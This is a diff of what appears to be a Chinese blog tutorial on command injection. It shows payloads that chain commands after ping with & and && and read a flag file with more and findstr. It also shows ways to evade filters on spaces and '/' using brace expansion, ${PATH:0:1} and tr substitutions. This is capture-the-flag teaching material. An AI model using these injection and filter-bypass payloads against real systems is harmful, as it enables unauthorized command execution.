@@ -631,17 +631,17 @@ flag
 flag_is_here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h4 id="2-2、more"><a href="#2-2、more" class="headerlink" title="2.2、more"></a>2.2、more</h4><p><strong>介绍：</strong><code>DOS</code> 命令行下查看文件内容的工具，可以多屏显示</p>
 <p><strong>举例：</strong></p>
-<pre class="line-numbers language-powershell"><code class="language-powershell">C:\Users\Savalen\Desktop>more flag<span class="token punctuation">.</span>txt
+<pre class="line-numbers language-powershell"><code class="language-powershell">C:\Users\valecalida\Desktop>more flag<span class="token punctuation">.</span>txt
 flag
 flag_is_here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h4 id="2-3、find"><a href="#2-3、find" class="headerlink" title="2.3、find"></a>2.3、find</h4><p><strong>介绍：</strong><code>DOS</code> 命令行下在文件中查找指定内容的工具</p>
 <p><strong>举例：</strong> </p>
-<pre class="line-numbers language-powershell"><code class="language-powershell">C:\Users\Savalen\Desktop>findstr <span class="token punctuation">.</span><span class="token operator">*</span> flag<span class="token punctuation">.</span>txt
+<pre class="line-numbers language-powershell"><code class="language-powershell">C:\Users\valecalida\Desktop>findstr <span class="token punctuation">.</span><span class="token operator">*</span> flag<span class="token punctuation">.</span>txt
 flag
 flag_is_here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h4 id="2-4、findstr"><a href="#2-4、findstr" class="headerlink" title="2.4、findstr"></a>2.4、findstr</h4><p><strong>介绍：</strong><code>DOS</code> 命令行下查找文件或内容的工具</p>
 <p><strong>举例：</strong> </p>
-<pre class="line-numbers language-powershell"><code class="language-powershell">C:\Users\Savalen\Desktop>find <span class="token operator">/</span>V <span class="token string">""</span> flag<span class="token punctuation">.</span>txt
+<pre class="line-numbers language-powershell"><code class="language-powershell">C:\Users\valecalida\Desktop>find <span class="token operator">/</span>V <span class="token string">""</span> flag<span class="token punctuation">.</span>txt
 
 <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span> FLAG<span class="token punctuation">.</span>TXT
 flag
@@ -672,15 +672,15 @@ root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span
 <p><strong>Tips：</strong> 这里可以直接将前面命令置为错误的</p>
 <h4 id="1-4、-amp"><a href="#1-4、-amp" class="headerlink" title="1.4、&amp;"></a>1.4、<code>&amp;</code></h4><p><strong>作用</strong>：如果前面的语句为假就直接执行后面的语句</p>
 <p><strong>举例：</strong></p>
-<pre class="line-numbers language-bash"><code class="language-bash">➜  Savalen <span class="token function">ping</span> -c 1 127.0.0. <span class="token operator">&amp;</span> <span class="token function">whoami</span>
+<pre class="line-numbers language-bash"><code class="language-bash">➜  valecalida <span class="token function">ping</span> -c 1 127.0.0. <span class="token operator">&amp;</span> <span class="token function">whoami</span>
 <span class="token punctuation">[</span>1<span class="token punctuation">]</span> 40
 root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><strong>Tips：</strong> 前面的语句同样可是为真</p>
 <h4 id="1-5、-amp-amp"><a href="#1-5、-amp-amp" class="headerlink" title="1.5、&amp;&amp;"></a>1.5、<code>&amp;&amp;</code></h4><p><strong>作用</strong>：如果前面的语句为假直接出错，后面的也不执行，所以前面的必须为真</p>
 <p><strong>举例：</strong></p>
-<pre class="line-numbers language-bash"><code class="language-bash">➜  Savalen <span class="token function">ping</span> -c 1 127.0.0. <span class="token operator">&amp;&amp;</span> <span class="token function">whoami</span>
+<pre class="line-numbers language-bash"><code class="language-bash">➜  valecalida <span class="token function">ping</span> -c 1 127.0.0. <span class="token operator">&amp;&amp;</span> <span class="token function">whoami</span>
 ping: 127.0.0.: Name or <span class="token function">service</span> not known
-➜  Savalen <span class="token function">ping</span> -c 1 127.0.0.1 <span class="token operator">&amp;&amp;</span> <span class="token function">whoami</span>
+➜  valecalida <span class="token function">ping</span> -c 1 127.0.0.1 <span class="token operator">&amp;&amp;</span> <span class="token function">whoami</span>
 PING 127.0.0.1 <span class="token punctuation">(</span>127.0.0.1<span class="token punctuation">)</span> 56<span class="token punctuation">(</span>84<span class="token punctuation">)</span> bytes of data.
 64 bytes from 127.0.0.1: icmp_seq<span class="token operator">=</span>1 ttl<span class="token operator">=</span>128 time<span class="token operator">=</span>0.202 ms
 
@@ -746,16 +746,20 @@ flag_is_here<span aria-hidden="true" class="line-numbers-rows"><span></span><spa
 flag
 flag_is_here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><strong>Tips：</strong>这里需要注意，在 <code>zsh</code> 下 <code>$IFS</code> 是用不了的，只能在原SHELL环境下使用</p>
-<h5 id="3-1-3、-Command-Object"><a href="#3-1-3、-Command-Object" class="headerlink" title="3.1.3、{Command,Object}"></a>3.1.3、<code>{Command,Object}</code></h5><pre class="line-numbers language-bash"><code class="language-bash">root@DESKTOP-OHTJ68E:/mnt/c/Users/Savalen/Desktop<span class="token comment" spellcheck="true"># {cat,flag.txt}</span>
+<h5 id="3-1-3、-Command-Object"><a href="#3-1-3、-Command-Object" class="headerlink" title="3.1.3、{Command,Object}"></a>3.1.3、<code>{Command,Object}</code></h5><pre class="line-numbers language-bash"><code class="language-bash">root@VALECALIDA:/mnt/c/Users/valecalida/Desktop<span class="token comment" spellcheck="true"># {cat,flag.txt}</span>
 flag
 flag_is_here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h4 id="3-2、-的绕过"><a href="#3-2、-的绕过" class="headerlink" title="3.2、/ 的绕过"></a>3.2、<code>/</code> 的绕过</h4><h5 id="3-2-1、环境变量绕过"><a href="#3-2-1、环境变量绕过" class="headerlink" title="3.2.1、环境变量绕过"></a>3.2.1、环境变量绕过</h5><p>环境变量中第一个字符永远都是 <code>/</code> ，因此可以利用这个来绕过</p>
-<pre class="line-numbers language-bash"><code class="language-bash">root@DESKTOP-OHTJ68E:~<span class="token comment" spellcheck="true"># cat ${PATH:0:1}root${PATH:0:1}flag.txt</span>
+<pre class="line-numbers language-bash"><code class="language-bash">root@VALECALIDA:~<span class="token comment" spellcheck="true"># cat ${PATH:0:1}root${PATH:0:1}flag.txt</span>
 flag
 flag_is_here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h5 id="3-2-2、-echo-tr-39-0-39-39-quot-1-39"><a href="#3-2-2、-echo-tr-39-0-39-39-quot-1-39" class="headerlink" title="3.2.2、$(echo . | tr &#39;!-0&#39; &#39;&quot;-1&#39;)"></a>3.2.2、<code>$(echo . | tr &#39;!-0&#39; &#39;&quot;-1&#39;)</code></h5><h5 id="3-2-3、-tr-39-0-39-39-quot-1-39-lt-lt-lt"><a href="#3-2-3、-tr-39-0-39-39-quot-1-39-lt-lt-lt" class="headerlink" title="3.2.3、$(tr &#39;!-0&#39; &#39;&quot;-1&#39; &lt;&lt;&lt; .)"></a>3.2.3、<code>$(tr &#39;!-0&#39; &#39;&quot;-1&#39; &lt;&lt;&lt; .)</code></h5><pre><code>root@DESKTOP-OHTJ68E:~# cat $(tr &#39;!-0&#39; &#39;&quot;-1&#39; &lt;&lt;&lt; .)root$(tr &#39;!-0&#39; &#39;&quot;-1&#39; &lt;&lt;&lt; .)flag.txt
+<h5 id="3-2-2、-echo-tr-39-0-39-39-quot-1-39"><a href="#3-2-2、-echo-tr-39-0-39-39-quot-1-39" class="headerlink" title="3.2.2、$(echo . | tr &#39;!-0&#39; &#39;&quot;-1&#39;)"></a>3.2.2、<code>$(echo . | tr &#39;!-0&#39; &#39;&quot;-1&#39;)</code></h5><pre class="line-numbers language-bash"><code class="language-bash">root@VALECALIDA:~<span class="token comment" spellcheck="true"># cat $(echo . | tr '!-0' '"-1')root$(echo . | tr '!-0' '"-1')flag.txt</span>
 flag
-flag_is_here</code></pre>
+flag_is_here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h5 id="3-2-3、-tr-39-0-39-39-quot-1-39-lt-lt-lt"><a href="#3-2-3、-tr-39-0-39-39-quot-1-39-lt-lt-lt" class="headerlink" title="3.2.3、$(tr &#39;!-0&#39; &#39;&quot;-1&#39; &lt;&lt;&lt; .)"></a>3.2.3、<code>$(tr &#39;!-0&#39; &#39;&quot;-1&#39; &lt;&lt;&lt; .)</code></h5><pre class="line-numbers language-bash"><code class="language-bash">root@VALECALIDA:~<span class="token comment" spellcheck="true"># cat $(tr '!-0' '"-1' &lt;&lt;&lt; .)root$(tr '!-0' '"-1' &lt;&lt;&lt; .)flag.txt</span>
+flag
+flag_is_here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
             </div>
             <hr/>
 
